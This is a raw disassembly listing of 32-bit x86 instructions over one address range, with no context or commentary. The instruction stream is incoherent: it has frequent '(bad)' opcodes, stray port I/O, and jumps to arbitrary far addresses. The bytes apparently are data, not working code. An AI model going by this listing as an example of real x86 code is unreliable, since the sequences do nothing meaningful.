  40c413:	mov    DWORD PTR [edx+0x45a46222],esi
  40c419:	mov    BYTE PTR [eax],ch
  40c41b:	inc    esp
  40c41c:	xchg   esp,eax
  40c41d:	and    edx,ebp
  40c41f:	and    bl,ch
  40c421:	shr    DWORD PTR [eax],cl
  40c423:	fsub   QWORD PTR [edx-0x7a4bde93]
  40c429:	cwde   
  40c42a:	jecxz  0x40c494
  40c42c:	or     BYTE PTR [edi+esi*4-0x24b854e5],dl
  40c433:	cld    
  40c434:	ror    esp,0x9
  40c437:	xor    DWORD PTR [edi+ecx*1-0x6a804c94],eax
  40c43e:	xor    al,0x4c
  40c440:	adc    dl,BYTE PTR [ebp+0x6cec982e]
  40c446:	inc    esp
  40c447:	call   0xf2b8c674
  40c44c:	cmp    dl,0x82
  40c44f:	das    
  40c450:	push   ss
  40c451:	test   BYTE PTR [ebp-0x1a],dl
  40c454:	jecxz  0x40c490
  40c456:	test   DWORD PTR [ebp+0x36],0xf12be144
  40c45d:	leave  
  40c45e:	dec    ecx
  40c45f:	mov    esp,0x36c4cbe
  40c464:	push   esp
  40c465:	test   ecx,edi
  40c467:	mov    esi,0x470f8701
  40c46c:	popa   
  40c46d:	inc    esi
  40c46e:	xor    ah,BYTE PTR [ebp+0x3754358b]
  40c474:	adc    cl,BYTE PTR [esi+0x49]
  40c477:	retf   
  40c478:	lods   eax,DWORD PTR ds:[esi]
  40c479:	loope  0x40c49d
  40c47b:	pop    ecx
  40c47c:	dec    ecx
  40c47d:	(bad)  
  40c47f:	sbb    al,0x98
  40c481:	lods   eax,DWORD PTR ds:[esi]
  40c482:	mov    esp,0x99d5d93f
  40c487:	scas   eax,DWORD PTR es:[edi]
  40c488:	in     al,0xc3
  40c48a:	cld    
  40c48b:	outs   dx,DWORD PTR ds:[esi]
  40c48c:	xchg   edi,eax
  40c48d:	call   0xb544:0x9cb2ca
  40c494:	cmp    DWORD PTR [edx-0x14],0x62
  40c498:	push   ss
  40c499:	mov    WORD PTR [edx+0x23],fs
  40c49c:	or     al,0xf3
  40c49e:	test   ecx,0x8651bd56
  40c4a4:	stos   BYTE PTR es:[edi],al
  40c4a5:	xchg   BYTE PTR [ebx+0x1c],bh
  40c4a8:	(bad)  
  40c4aa:	dec    edx
  40c4ab:	fadd   QWORD PTR [edx+0x23]
  40c4ae:	lock dec esp
  40c4b0:	pop    ecx
  40c4b1:	(bad)  
  40c4b2:	outs   dx,BYTE PTR ds:[esi]
  40c4b3:	xchg   DWORD PTR ds:0x63d89b15,esi
  40c4b9:	(bad)  
  40c4ba:	les    ebx,FWORD PTR [esp+edx*8+0x636e93e3]
  40c4c1:	fidiv  WORD PTR [ecx-0x3]
  40c4c4:	xchg   ebx,eax
  40c4c5:	xchg   BYTE PTR [eax-0x6],ch
  40c4c8:	sahf   
  40c4c9:	fist   DWORD PTR [ebx+0x45]
  40c4cc:	fnop   
  40c4ce:	pop    esp
  40c4cf:	clc    
  40c4d0:	dec    si
  40c4d2:	in     al,0x8d
  40c4d4:	in     al,0x19
  40c4d6:	mov    esp,0x60c7988a
  40c4db:	fucomp st(7)
  40c4dd:	stos   BYTE PTR es:[edi],al
  40c4de:	aaa    
  40c4df:	sub    eax,0x749af0c7
  40c4e4:	mov    DWORD PTR ds:0x9544ec79,ebx
  40c4ea:	cmp    DWORD PTR [edx+edx*2-0x6e],eax
  40c4ee:	dec    esp
  40c4ef:	ret    
  40c4f0:	jb     0x40c489
  40c4f2:	xor    al,0xd3
  40c4f4:	hlt    
  40c4f5:	sub    al,0x58
  40c4f7:	and    al,0x6d
  40c4f9:	jnp    0x40c4ff
  40c4fb:	sub    esi,ecx
  40c4fd:	stos   BYTE PTR es:[edi],al
  40c4fe:	push   es
  40c4ff:	(bad)  
  40c501:	push   ebx
  40c502:	stos   DWORD PTR es:[edi],eax
  40c503:	xor    bh,al
  40c505:	stc    
  40c506:	or     BYTE PTR [esi+edi*4-0x74f2a85a],dl
  40c50d:	popa   
  40c50e:	vpminsw ymm4,ymm1,ymm2
  40c512:	xchg   BYTE PTR [ebx-0x23],dl
  40c515:	rcl    BYTE PTR [ebp+edx*4-0x1],cl
  40c519:	test   esp,edi
  40c51b:	stc    
  40c51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c51d:	cs cld 
  40c51f:	(bad)  
  40c520:	retf   0x4659
  40c523:	es xchg ebx,eax
  40c525:	js     0x40c556
  40c527:	fldcw  WORD PTR [esi-0x41459043]
  40c52d:	jno    0x40c50b
  40c52f:	adc    cl,ah
  40c531:	pop    esi
  40c532:	in     eax,dx
  40c533:	dec    ebp
  40c534:	fs jmp 0x9270a99
  40c53a:	inc    ebx
  40c53b:	cmp    al,0x25
  40c53d:	push   eax
  40c53e:	cdq    
  40c53f:	repz inc edx
  40c541:	xchg   edx,eax
  40c542:	les    esi,FWORD PTR [edx+0x5c]
  40c545:	push   esp
  40c546:	xor    cl,dl
  40c548:	pop    ds
  40c549:	push   ss
  40c54a:	fucomip st,st(4)
  40c54c:	fwait
  40c54d:	pop    esp
  40c54e:	lods   al,BYTE PTR ds:[esi]
  40c54f:	mov    esi,0xa4a78478
  40c554:	lods   al,BYTE PTR ds:[esi]
  40c555:	(bad)  
  40c557:	pushf  
  40c558:	aaa    
  40c559:	jo     0x40c546
  40c55b:	in     eax,0x87
  40c55d:	clc    
  40c55e:	push   ds
  40c55f:	out    dx,al
  40c560:	stos   BYTE PTR es:[edi],al
  40c561:	xchg   edi,eax
  40c562:	shl    ch,1
  40c564:	lods   al,BYTE PTR ds:[esi]
  40c565:	mov    ah,dh
  40c567:	sar    DWORD PTR [ebp+0x7bd98348],1
  40c56d:	or     ebx,esp
  40c56f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c570:	popf   
  40c571:	arpl   WORD PTR [esi],bx
  40c573:	cmp    al,0x5b
  40c575:	pop    esp
  40c576:	cs mov cl,0x69
  40c579:	(bad)  
  40c57a:	icebp  
  40c57b:	stc    
  40c57c:	push   edi
  40c57d:	repnz dec edi
  40c57f:	pop    ebx
  40c580:	arpl   WORD PTR [ebx+0xe4b0e5],di
  40c586:	nop
  40c587:	loope  0x40c57b
  40c589:	add    eax,0x6af0f460
  40c58e:	sbb    DWORD PTR [edx+0x45],ecx
  40c591:	ret    
  40c592:	test   ecx,0x1b84fafa
  40c598:	adc    BYTE PTR [eax+0x1f00a96a],cl
  40c59e:	cld    
  40c59f:	fs inc ebp
  40c5a1:	outs   dx,BYTE PTR ds:[esi]
  40c5a2:	inc    ecx
  40c5a3:	mov    cl,0xaa
  40c5a5:	inc    esi
  40c5a6:	or     al,0x2
  40c5a8:	add    DWORD PTR [edx],esp
  40c5aa:	rcl    DWORD PTR [ecx-0x7f],cl
  40c5ad:	sub    eax,0x28e78a49
  40c5b2:	mov    BYTE PTR [esi+edi*2+0x413d494],dl
  40c5b9:	fiadd  DWORD PTR [edi+0x4b433b8e]
  40c5bf:	lods   al,BYTE PTR ds:[esi]
  40c5c0:	xchg   esp,eax
  40c5c1:	aas    
  40c5c2:	inc    edi
  40c5c3:	mov    ecx,0x434e73e1
  40c5c8:	shr    BYTE PTR [edi],1
  40c5ca:	jmp    0xff1:0xaa6a09fe
  40c5d1:	sub    BYTE PTR [eax+0x48],bl
  40c5d4:	std    
  40c5d5:	xlat   BYTE PTR ds:[ebx]
  40c5d6:	xor    al,0xe5
  40c5d8:	add    DWORD PTR [edx+0xaf721cb],esi
  40c5de:	jp     0x40c656
  40c5e0:	push   0x7c
  40c5e2:	dec    esp
  40c5e3:	sub    DWORD PTR ds:0xd16976b5,esp
  40c5e9:	mov    ah,0x83
  40c5eb:	mov    ah,0x9f
  40c5ee:	mov    ds:0x3a9c4888,eax
  40c5f3:	dec    ebp
  40c5f4:	fcom   QWORD PTR [esi]
  40c5f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5f8:	xchg   BYTE PTR [ebp+0x4c92be06],dh
  40c5fe:	ins    DWORD PTR es:[edi],dx
  40c5ff:	lock sub al,0x58
  40c602:	xor    al,0x13
  40c604:	and    eax,0x232aec57
  40c609:	or     DWORD PTR [edi+0x454f7caa],eax
  40c60f:	sub    eax,0x9c946f20
  40c614:	cdq    
  40c615:	inc    edx
  40c616:	cmp    ch,BYTE PTR [ebp-0x21541d5f]
  40c61c:	stos   BYTE PTR es:[edi],al
  40c61d:	jns    0x40c64a
  40c61f:	sub    esi,DWORD PTR [ecx]
  40c621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c622:	test   bl,0x6f
  40c625:	xor    al,0x4e
  40c627:	scas   eax,DWORD PTR es:[edi]
  40c628:	in     al,0x0
  40c62a:	push   esi
  40c62b:	or     DWORD PTR [ebx+0x547983ab],eax
  40c631:	bound  esi,QWORD PTR [ebx]
  40c633:	push   0xf021ef8b
  40c638:	mov    ah,0x8a
  40c63a:	loopne 0x40c5e9
  40c63c:	ror    bl,0x1
  40c63f:	mov    ds:0xc09594e0,al
  40c644:	enter  0x7556,0xf7
  40c648:	xor    DWORD PTR [ecx+0x7905bf7a],ebp
  40c64e:	das    
  40c64f:	push   0xfc384e63
  40c654:	outs   dx,BYTE PTR ds:[esi]
  40c655:	mov    ah,0x43
  40c657:	js     0x40c6b4
  40c659:	and    al,0x54
  40c65b:	dec    esi
  40c65c:	cmp    dl,dh
  40c65e:	sub    edx,DWORD PTR [esi+0x4f]
  40c661:	in     al,dx
  40c662:	imul   eax,DWORD PTR [edx+0x5902111c],0x3d
  40c669:	scas   al,BYTE PTR es:[edi]
  40c66a:	fdivp  st(4),st
  40c66c:	mov    esp,0x2755a5bf
  40c671:	fst    QWORD PTR [edi+edi*4-0x2dd97ca7]
  40c678:	psrad  mm1,QWORD PTR ss:[ecx-0x4e8143e8]
  40c680:	neg    cl
  40c682:	popa   
  40c683:	pop    ds
  40c684:	sbb    cl,BYTE PTR [eax-0x7d]
  40c687:	loopne 0x40c6f1
  40c689:	rcl    DWORD PTR ds:0x22f1045,0xb0
  40c690:	vshufpd ymm5,ymm0,ymm1,0x9
  40c695:	jo     0x40c65b
  40c697:	mov    ah,0xa2
  40c699:	or     eax,0xeba6785e
  40c69e:	and    eax,0x2b50ac53
  40c6a3:	rcl    DWORD PTR [ebx-0x25],1
  40c6a6:	ja     0x40c70d
  40c6a8:	push   eax
  40c6a9:	sub    esi,DWORD PTR [eax-0x15]
  40c6ac:	dec    eax
  40c6ad:	fsub   QWORD PTR [edx-0x7088cb5]
  40c6b3:	sbb    ecx,DWORD PTR [ebx]
  40c6b5:	jge    0x40c65f
  40c6b7:	stos   BYTE PTR es:[edi],al
  40c6b8:	fistp  QWORD PTR [ecx-0x7d]
  40c6bb:	mov    BYTE PTR [edi+0xc309c23],al
  40c6c1:	inc    ebx
  40c6c2:	xchg   ebp,eax
  40c6c3:	inc    eax
  40c6c4:	call   0x1d1482a7
  40c6c9:	and    eax,0x5953c453
  40c6ce:	(bad)  
  40c6cf:	fidiv  DWORD PTR [esi-0x1b798980]
  40c6d5:	int3   
  40c6d6:	ss adc ebx,edi
  40c6d9:	gs (bad) 
  40c6db:	cmp    al,BYTE PTR [ebx-0x6e]
  40c6de:	hlt    
  40c6df:	shl    BYTE PTR [eax],1
  40c6e1:	xchg   esi,eax
  40c6e2:	inc    eax
  40c6e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6e4:	xchg   esi,eax
  40c6e5:	rol    BYTE PTR [edi],0xcd
  40c6e8:	xchg   ebp,eax
  40c6e9:	mov    ds:0x61c18715,eax
  40c6ee:	cmp    dl,0xa3
  40c6f1:	addr16 sbb al,0x2e
  40c6f4:	pushf  
  40c6f5:	sub    esp,esi
  40c6f7:	pop    edx
  40c6f8:	dec    edi
  40c6f9:	xor    ecx,DWORD PTR [esi]
  40c6fb:	mov    BYTE PTR [edi-0x2d80bffc],dl
  40c701:	pusha  
  40c702:	clc    
  40c703:	inc    DWORD PTR [ecx-0xd]
  40c706:	aad    0x42
  40c708:	rcl    BYTE PTR [edi-0x5d],cl
  40c70b:	sahf   
  40c70c:	xlat   BYTE PTR ds:[ebx]
  40c70d:	mov    bl,0xa8
  40c70f:	mov    eax,0xa68e0698
  40c714:	jmp    0x746e:0xff029716
  40c71b:	ins    BYTE PTR es:[edi],dx
  40c71c:	sub    DWORD PTR [eax+eiz*8+0x29],eax
  40c720:	add    eax,0x67f01401
  40c725:	cwde   
  40c726:	jnp    0x40c706
  40c728:	adc    edi,DWORD PTR [eax+0x12]
  40c72b:	sbb    eax,0x7fdd2744
  40c730:	daa    
  40c731:	push   edi
  40c732:	inc    ebp
  40c733:	dec    esi
  40c734:	mov    ds:0x84924d10,eax
  40c739:	cwde   
  40c73a:	(bad)
  40c73e:	add    ebp,DWORD PTR [ecx-0x59]
  40c741:	popa   
  40c742:	sahf   
  40c743:	push   cs
  40c744:	lea    ebp,[ebx+0x17]
  40c747:	adc    eax,0x782dd77e
  40c74c:	cmp    DWORD PTR [eax+0x7c],eax
  40c74f:	div    DWORD PTR [edx]
  40c751:	outs   dx,DWORD PTR ds:[esi]
  40c752:	mov    ch,bl
  40c754:	stos   DWORD PTR es:[edi],eax
  40c755:	add    eax,0x7b6b583e
  40c75a:	cmp    al,0x5f
  40c75c:	movq   mm5,mm6
  40c75f:	jge    0x40c7da
  40c761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c762:	das    
  40c763:	jl     0x40c792
  40c765:	xchg   esp,eax
  40c766:	sub    DWORD PTR [ebx],esp
  40c768:	ja     0x40c790
  40c76a:	push   es
  40c76b:	adc    dl,BYTE PTR [ecx]
  40c76d:	xchg   ebp,eax
  40c76e:	repz int3 
  40c770:	pop    ds
  40c771:	add    esi,edx
  40c773:	aam    0xfd
  40c775:	push   esp
  40c776:	push   0xb4503caa
  40c77b:	lahf   
  40c77c:	mov    bl,0x52
  40c77e:	cmp    eax,0x45978c34
  40c783:	and    BYTE PTR [edi],al
  40c785:	inc    eax
  40c786:	outs   dx,DWORD PTR ds:[esi]
  40c787:	inc    esp
  40c788:	in     eax,dx
  40c789:	loopne 0x40c785
  40c78b:	xchg   edi,eax
  40c78c:	enter  0xa81e,0x3d
  40c790:	cwde   
  40c791:	sbb    al,0xf2
  40c793:	xor    esp,DWORD PTR [edx]
  40c795:	fs push cs
  40c797:	stos   DWORD PTR es:[edi],eax
  40c798:	das    
  40c799:	sbb    eax,0xaa558d54
  40c79e:	repz (bad) 
  40c7a0:	pop    eax
  40c7a1:	lods   eax,DWORD PTR ds:[esi]
  40c7a2:	cld    
  40c7a3:	pop    edx
  40c7a4:	mov    dh,0xa6
  40c7a6:	dec    eax
  40c7a7:	mov    bl,dl
  40c7a9:	add    DWORD PTR [edi+edx*4-0x72916d64],ecx
  40c7b0:	xchg   esp,eax
  40c7b1:	cmc    
  40c7b2:	ss in  eax,0xd5
  40c7b5:	scas   eax,DWORD PTR es:[edi]
  40c7b6:	or     al,0x4d
  40c7b8:	inc    ecx
  40c7b9:	in     eax,dx
  40c7ba:	xchg   BYTE PTR [ebx+0x75],dl
  40c7bd:	retf   
  40c7be:	mov    al,BYTE PTR [edx+0x7]
  40c7c1:	loope  0x40c749
  40c7c3:	icebp  
  40c7c4:	sub    bh,bh
  40c7c6:	outs   dx,DWORD PTR ds:[esi]
  40c7c7:	jmp    0x40c750
  40c7c9:	add    DWORD PTR [ebx+ebx*2],ebx
  40c7cc:	in     eax,0xe
  40c7ce:	mov    ebx,0xde4055d1
  40c7d3:	leave  
  40c7d4:	adc    bl,BYTE PTR [esi]
  40c7d6:	popf   
  40c7d7:	out    dx,eax
  40c7d8:	pop    esi
  40c7d9:	stos   BYTE PTR es:[edi],al
  40c7da:	dec    esi
  40c7db:	mov    ds:0x29b81c1c,al
  40c7e0:	lea    ecx,[edx]
  40c7e2:	rcr    dh,1
  40c7e4:	mov    edx,0xa003cf63
  40c7e9:	or     BYTE PTR [esi+0xb],dh
  40c7ec:	repnz shl BYTE PTR [edi-0x1d],1
  40c7f0:	daa    
  40c7f1:	repnz xor ebx,DWORD PTR [ebp-0x345f67ba]
  40c7f8:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40c7fa:	fst    st(3)
  40c7fc:	mov    al,BYTE PTR [edx+eiz*8]
  40c7ff:	add    eax,0x4368d99d
  40c804:	jmpw   0xc991
  40c808:	add    eax,0xbf825d68
  40c80d:	add    eax,0xd31d32af
  40c812:	inc    ecx
  40c813:	inc    esp
  40c814:	dec    eax
  40c815:	pop    edx
  40c816:	lds    ebx,FWORD PTR [edx+edi*1-0x6]
  40c81a:	sti    
  40c81b:	icebp  
  40c81c:	mov    dh,BYTE PTR [eax]
  40c81e:	das    
  40c81f:	fnstsw WORD PTR [ecx]
  40c821:	and    eax,DWORD PTR [edx]
  40c823:	push   ecx
  40c824:	adc    al,0xed
  40c826:	mul    DWORD PTR [edi]
  40c828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c829:	mov    esi,0xb8b55168
  40c82e:	push   ecx
  40c82f:	adc    ch,0xc
  40c832:	pop    ebp
  40c833:	cmc    
  40c834:	loop   0x40c7f3
  40c836:	adc    ebx,DWORD PTR [edx-0x61]
  40c839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c83a:	aas    
  40c83b:	xor    BYTE PTR [esi],cl
  40c83d:	dec    esi
  40c83e:	fcomp  QWORD PTR [ecx]
  40c840:	and    al,BYTE PTR [ebx+0x6f]
  40c843:	jno    0x40c7fa
  40c845:	ins    DWORD PTR es:[edi],dx
  40c846:	cmp    ch,al
  40c848:	add    DWORD PTR [eax],edx
  40c84a:	sub    al,0xbc
  40c84c:	imul   edx,DWORD PTR [eax+0x6a],0x54cdad01
  40c853:	xchg   ecx,eax
  40c854:	iret   
  40c855:	retf   
  40c856:	xor    BYTE PTR [ecx-0x735c4999],dl
  40c85c:	jo     0x40c83a
  40c85e:	adc    dl,BYTE PTR [edi+eax*2+0x419838c2]
  40c865:	mov    eax,0x73ded91a
  40c86a:	jbe    0x40c8bd
  40c86c:	inc    ebp
  40c86d:	jno    0x40c8ea
  40c86f:	hlt    
  40c870:	sub    eax,0x7c167c77
  40c875:	mov    ds:0x2af27c24,eax
  40c87a:	sar    DWORD PTR [edi-0x6f5700cf],1
  40c880:	sahf   
  40c881:	outs   dx,DWORD PTR ds:[esi]
  40c882:	mov    esp,0xa625b14d
  40c887:	cmp    eax,eax
  40c889:	xchg   DWORD PTR [eax+esi*1],esi
  40c88c:	call   0xe7f2:0x841e922
  40c893:	loopne 0x40c8a5
  40c895:	jno    0x40c82d
  40c897:	repnz imul ebp,DWORD PTR [esi+0x474c4670],0x22f1d9ce
  40c8a2:	bound  ax,DWORD PTR [edx+ebp*1-0x4455d682]
  40c8aa:	sbb    ebx,DWORD PTR [esi]
  40c8ac:	push   0xffffffca
  40c8ae:	mov    ds:0x8891ca22,al
  40c8b3:	addr16 mov edx,0x4bc77d48
  40c8b9:	push   ebp
  40c8ba:	sbb    DWORD PTR [esi],esi
  40c8bc:	push   0x61
  40c8be:	out    dx,eax
  40c8bf:	pop    ebx
  40c8c0:	cwde   
  40c8c1:	and    esp,eax
  40c8c3:	outs   dx,BYTE PTR ds:[esi]
  40c8c4:	xchg   esp,eax
  40c8c5:	outs   dx,BYTE PTR ds:[esi]
  40c8c6:	mov    ds:0xc9a53cf,al
  40c8cb:	jb     0x40c86a
  40c8cd:	mov    bh,0x5a
  40c8cf:	push   edi
  40c8d0:	gs repnz sbb al,0x71
  40c8d4:	inc    esi
  40c8d5:	shl    DWORD PTR [edx+0x2e6cbb40],0x5a
  40c8dc:	jo     0x40c867
  40c8de:	imul   ebp,DWORD PTR [edi-0x5434366d],0xffffff89
  40c8e5:	mov    BYTE PTR [edi+esi*8+0xa],0xd8
  40c8ea:	enter  0x96f1,0x92
  40c8ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8ef:	fisttp QWORD PTR [edi-0x37]
  40c8f2:	adc    eax,0xfe423f3
  40c8f7:	ret    0x43de
  40c8fa:	mov    dh,0xad
  40c8fc:	ror    bl,0xc2
  40c8ff:	pop    edi
  40c900:	inc    edi
  40c901:	pop    ebp
  40c902:	ja     0x40c917
  40c904:	scas   al,BYTE PTR es:[edi]
  40c905:	dec    edi
  40c906:	pop    edi
  40c907:	dec    ebp
  40c908:	jmp    0x40c91f
  40c90a:	xor    edi,DWORD PTR [edi]
  40c90c:	adc    DWORD PTR [edi+0x2c],0xffffffe4
  40c910:	or     BYTE PTR [edx-0x57f8d03f],ch
  40c916:	icebp  
  40c917:	pop    ebx
  40c918:	int    0x1d
  40c91a:	sahf   
  40c91b:	push   0xba2e0b1c
  40c920:	push   0x20
  40c922:	cmp    DWORD PTR [ebp+0x0],ebp
  40c925:	cmp    DWORD PTR [ecx-0x11],edx
  40c928:	in     al,dx
  40c929:	sub    BYTE PTR ds:0xd2bd5cdb,0x8d
  40c930:	mov    ah,0x5c
  40c932:	adc    eax,0xc6dcb22f
  40c937:	inc    esi
  40c938:	mov    dl,0x48
  40c93a:	jp     0x40c8e6
  40c93c:	add    dl,dh
  40c93e:	mov    ecx,0x679aa119
  40c943:	and    ah,bl
  40c945:	test   DWORD PTR [esi+0x60],edi
  40c948:	lea    esi,[edi+0x16]
  40c94b:	jmp    0x23d3:0xdcfafe5e
  40c952:	adc    DWORD PTR [ecx],ebx
  40c954:	(bad)  
  40c955:	clc    
  40c956:	out    0xbc,eax
  40c958:	inc    esi
  40c959:	cs jecxz 0x40c8f4
  40c95c:	pop    ds
  40c95d:	xor    eax,0xf06a8c3
  40c962:	loopne 0x40c940
  40c964:	cdq    
  40c965:	dec    eax
  40c966:	jle    0x40c9a6
  40c968:	fstp   QWORD PTR [ecx-0x80]
  40c96b:	loope  0x40c903
  40c96d:	mov    bl,0x8c
  40c96f:	jle    0x40c963
  40c971:	or     ch,BYTE PTR [esi+ebx*2-0x2d871fe]
  40c978:	add    al,0xcf
  40c97a:	and    eax,0x56da9918
  40c97f:	arpl   cx,ax
  40c981:	and    BYTE PTR [ebx],dh
  40c983:	out    0x72,al
  40c985:	out    dx,al
  40c986:	sti    
  40c987:	cmp    DWORD PTR [eax],ecx
  40c989:	xchg   ebx,eax
  40c98a:	mov    cl,0xd1
  40c98c:	xchg   ebp,eax
  40c98d:	(bad)  
  40c98e:	dec    ecx
  40c98f:	(bad)  
  40c991:	gs test eax,0x9ee0243d
  40c997:	imul   edx,DWORD PTR [ecx+esi*1-0x33],0xffffffb2
  40c99c:	ins    BYTE PTR es:[edi],dx
  40c99d:	fidivr WORD PTR [edx]
  40c99f:	repnz pop esp
  40c9a1:	jns    0x40c9df
  40c9a3:	leave  
  40c9a4:	dec    edi
  40c9a5:	mov    cl,0xd1
  40c9a7:	mov    ds:0x65d4fe23,al
  40c9ac:	cmp    eax,0xb01a155d
  40c9b1:	and    DWORD PTR [ebx],ecx
  40c9b3:	sbb    al,0xdc
  40c9b5:	mov    al,BYTE PTR [eax]
  40c9b7:	fcomip st,st(0)
  40c9b9:	outs   dx,DWORD PTR ds:[esi]
  40c9ba:	inc    eax
  40c9bb:	or     edi,esi
  40c9bd:	add    ebp,DWORD PTR [ecx]
  40c9bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9c0:	add    ecx,ebx
  40c9c2:	and    eax,0xd80e3fd0
  40c9c7:	stos   BYTE PTR es:[edi],al
  40c9c8:	or     al,0x70
  40c9ca:	and    ch,cl
  40c9cc:	and    al,0xbe
  40c9ce:	adc    eax,0xbe50e536
  40c9d3:	into   
  40c9d4:	mov    BYTE PTR [eax+0x13],bh
  40c9d7:	sbb    edx,0x7199619d
  40c9dd:	and    BYTE PTR [ebx+0x4],bl
  40c9e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9e1:	dec    edx
  40c9e2:	mov    edx,0x425fb868
  40c9e7:	aad    0x6c
  40c9e9:	adc    eax,0x8fcb985b
  40c9ee:	(bad)  
  40c9ef:	icebp  
  40c9f0:	push   ds
  40c9f1:	adc    DWORD PTR [eax+eiz*2-0x18],0xffffff81
  40c9f6:	stos   BYTE PTR es:[edi],al
  40c9f7:	push   fs
  40c9f9:	jg     0x40c9b5
  40c9fb:	rcr    BYTE PTR [ecx-0x5b],0xf1
  40c9ff:	test   eax,0xef59e4c0
  40ca04:	mov    DWORD PTR [ecx+ebp*8+0x3],esi
  40ca08:	mov    ds:0x5b77c7ca,al
  40ca0d:	xchg   edi,eax
  40ca0e:	xor    esi,0x75
  40ca11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca12:	xchg   edx,eax
  40ca13:	aas    
  40ca14:	xchg   ebx,eax
  40ca15:	inc    esp
  40ca16:	push   esi
  40ca17:	and    eax,0x2f5c1f38
  40ca1c:	push   eax
  40ca1d:	dec    ebp
  40ca1e:	pop    ss
  40ca1f:	ja     0x40ca40
  40ca21:	xor    ecx,esp
  40ca23:	enter  0xc5d5,0x11
  40ca27:	shl    DWORD PTR [eax-0x63a8b5c2],cl
  40ca2d:	push   esp
  40ca2e:	mov    bl,0xc0
  40ca30:	add    cl,BYTE PTR [esi+0x58d00cd7]
  40ca36:	pop    esp
  40ca37:	and    esp,DWORD PTR [edi+0x56]
  40ca3a:	mov    al,ds:0x9fcfbbf0
  40ca3f:	cmp    eax,0xe46e2e61
  40ca44:	test   eax,0xfa0ce7b6
  40ca49:	out    0x8e,al
  40ca4b:	lods   al,BYTE PTR ds:[esi]
  40ca4c:	inc    esp
  40ca4d:	fdivr  DWORD PTR [ebp+0x38d3f2d5]
  40ca53:	inc    ebp
  40ca54:	lods   eax,DWORD PTR ds:[esi]
  40ca55:	les    edx,FWORD PTR cs:[ebx]
  40ca58:	xor    al,0x4c
  40ca5a:	add    bh,BYTE PTR [ebx+ebp*4]
  40ca5d:	ins    BYTE PTR es:[edi],dx
  40ca5e:	inc    edx
  40ca5f:	loop   0x40c9e2
  40ca61:	(bad)  
  40ca63:	sbb    eax,0x53314ed4
  40ca68:	rcl    BYTE PTR [esi-0x36],cl
  40ca6b:	sbb    eax,DWORD PTR [eax]
  40ca6d:	mov    es,edi
  40ca6f:	push   edx
  40ca70:	(bad)  
  40ca71:	pop    edi
  40ca72:	lea    esi,[eax]
  40ca74:	or     ebp,DWORD PTR [edx+0x6d]
  40ca77:	outs   dx,DWORD PTR ds:[esi]
  40ca78:	inc    esi
  40ca79:	sbb    eax,esp
  40ca7b:	xchg   DWORD PTR [esi-0x2a025b29],edx
  40ca81:	je     0x40ca8d
  40ca83:	push   edi
  40ca84:	es xchg ecx,eax
  40ca86:	loop   0x40ca4d
  40ca88:	ds ret 0xc2a7
  40ca8c:	and    al,0x8a
  40ca8e:	repz cdq 
  40ca90:	popa   
  40ca91:	lock inc eax
  40ca93:	or     esp,DWORD PTR [esi]
  40ca95:	(bad)  
  40ca96:	xchg   ebx,eax
  40ca97:	xchg   ecx,eax
  40ca98:	sar    ch,0x52
  40ca9b:	sub    al,0x2a
  40ca9d:	xor    al,BYTE PTR [eax]
  40ca9f:	jae    0x40cab2
  40caa1:	or     cl,BYTE PTR [ebp+0x5e]
  40caa4:	retf   0x6cc2
  40caa7:	stos   BYTE PTR es:[edi],al
  40caa8:	push   0xffffffe2
  40caaa:	pop    edx
  40caab:	jae    0x40cad8
  40caad:	cld    
  40caae:	stos   BYTE PTR es:[edi],al
  40caaf:	and    esi,ecx
  40cab1:	adc    BYTE PTR [eax+0x353cf802],0x7a
  40cab8:	imul   ebp,esi,0xabbde602
  40cabe:	mov    ecx,0xf18cb44e
  40cac3:	mov    edx,0x5a4c9c4a
  40cac8:	iret   
  40cac9:	xchg   esi,eax
  40caca:	xlat   BYTE PTR ds:[ebx]
  40cacb:	or     dl,BYTE PTR [esi]
  40cacd:	jl     0x40cb3d
  40cacf:	push   esp
  40cad0:	sbb    dh,BYTE PTR [ecx-0x19e4499b]
  40cad6:	adc    al,BYTE PTR [edi+eax*8]
  40cad9:	(bad)  
  40cadb:	into   
  40cadc:	mov    ds:0x3ea7201c,eax
  40cae1:	pop    ebx
  40cae2:	inc    esi
  40cae3:	test   eax,0x264e0357
  40cae8:	(bad)  
  40cae9:	sbb    esp,DWORD PTR [eax]
  40caeb:	jmp    0xee9f6e02
  40caf0:	test   eax,0x788065cb
  40caf5:	ret    0x7045
  40caf8:	sub    al,0xdf
  40cafa:	mov    esi,0x3671bcf3
  40caff:	out    0x63,al
  40cb01:	fimul  WORD PTR [edx+0x1e]
  40cb04:	nop
  40cb05:	scas   eax,DWORD PTR es:[edi]
  40cb06:	ins    DWORD PTR es:[edi],dx
  40cb07:	or     bl,ah
  40cb09:	pop    ds
  40cb0a:	xchg   esi,eax
  40cb0b:	iret   
  40cb0c:	sub    esi,esp
  40cb0e:	sub    al,0x98
  40cb10:	mov    eax,0x73fe7948
  40cb15:	sar    bl,0x75
  40cb18:	pop    esp
  40cb19:	ja     0x40cb2b
  40cb1b:	addr16 jl 0x40cb44
  40cb1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb1f:	sub    ch,cl
  40cb21:	pop    ebx
  40cb22:	sub    BYTE PTR [ebp+0x55],bl
  40cb25:	xchg   ebx,eax
  40cb26:	shl    dl,cl
  40cb28:	jno    0x40cb4b
  40cb2a:	inc    ecx
  40cb2b:	loope  0x40cac7
  40cb2d:	dec    ebx
  40cb2e:	scas   eax,DWORD PTR es:[edi]
  40cb2f:	out    dx,eax
  40cb30:	je     0x40cb44
  40cb32:	and    BYTE PTR [edi-0x50],cl
  40cb35:	mov    ebx,0x2a5a7c88
